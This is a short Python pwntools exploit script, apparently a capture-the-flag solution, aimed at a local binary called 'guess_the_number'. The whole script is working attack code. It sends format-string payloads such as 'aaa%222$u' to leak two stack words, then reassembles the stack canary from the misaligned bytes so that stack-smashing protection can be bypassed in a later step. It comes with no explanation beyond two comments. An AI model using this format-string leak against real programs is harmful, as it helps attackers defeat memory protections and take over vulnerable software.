#!/bin/env python3
from pwn import *

path = context.binary = './guess_the_number_5c1549905c60d35ca812b2e666b7644b'
# context.terminal = ['xfce4-terminal', '-e']
context.log_level = 'debug'
p = process(argv=[path,'dumb_guy'])
# attach(p)
p.recvuntil('Your guess?')

# the canary isn't 4-bytes aligned with the stack when printf is called.
# so I have to get the 8 bytes around the canary and extract the wanted bytes.
b = [0,0]
for i, arg in enumerate((222,223)):
	p.sendline(f'aaa%{arg}$u')
	r = p.recvuntil('Enter a number.').decode('utf-8')
	b[i] = int(r[10:r.find('"', 10)])

canary = u32(bytes([p32(b[0])[0]]) + p32(b[1])[:3])
print('canary =',hex(canary))
p.close()
